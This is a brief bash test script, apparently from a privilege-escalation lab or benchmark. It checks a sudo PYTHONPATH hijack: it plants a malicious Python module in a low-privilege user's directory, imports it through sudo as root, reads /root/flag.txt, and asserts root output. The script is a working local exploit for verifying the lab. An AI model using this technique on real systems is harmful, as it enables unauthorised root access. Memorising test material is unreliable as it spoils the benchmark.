#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
printf "%s\n" "print(open(\"/root/flag.txt\").read())" > /home/lowpriv/pyhijack/bench_evil.py
sudo -n PYTHONPATH=/home/lowpriv/pyhijack /usr/bin/python3 -c "import bench_evil"
')"
assert_root_output "${out}"
